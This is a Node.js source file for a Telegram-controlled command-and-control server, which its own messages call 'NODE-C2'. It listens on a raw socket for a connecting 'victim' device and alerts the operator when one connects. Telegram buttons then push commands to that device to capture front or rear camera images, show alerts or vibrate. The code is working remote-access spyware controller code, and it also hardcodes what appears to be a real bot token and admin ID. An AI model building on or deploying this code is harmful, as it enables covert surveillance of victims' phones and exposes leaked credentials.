const { Telegraf, Markup } = require('telegraf');
const net = require('net');

const TOKEN = "8113157717:AAHUdnbkHj19lJHFhX4g93-GVSq9aE6nuLo";
const ADMIN_ID = 6654753506; // معرفك الشخصي
const PORT = 10000;
let agentSocket = null;

const bot = new Telegraf(TOKEN);

// إنشاء سيرفر السوكيت لاستقبال الضحية
const server = net.createServer((socket) => {
    agentSocket = socket;
    console.log("[!] Agent Connected!");
    bot.telegram.sendMessage(ADMIN_ID, "⚠️ تم اتصال ضحية جديدة بالمختبر!");
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Socket server listening on port ${PORT}`);
});

bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ نظام التحكم NODE-C2 نشط. اختر أمراً:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 كاميرا أمامية', 'cam_1'), Markup.button.callback('📸 كاميرا خلفية', 'cam_0')],
            [Markup.button.callback('🔔 إرسال إشعار', 'alert'), Markup.button.callback('📳 اهتزاز', 'vibrate')]
        ])
    );
});

bot.action(/cam_|vibrate/, (ctx) => {
    if (agentSocket) {
        agentSocket.write(ctx.match.input);
        ctx.answerCbQuery(`🚀 جاري تنفيذ ${ctx.match.input}...`);
    } else {
        ctx.answerCbQuery("❌ لا يوجد جهاز متصل!");
    }
});

bot.launch();
console.log("Bot is running...");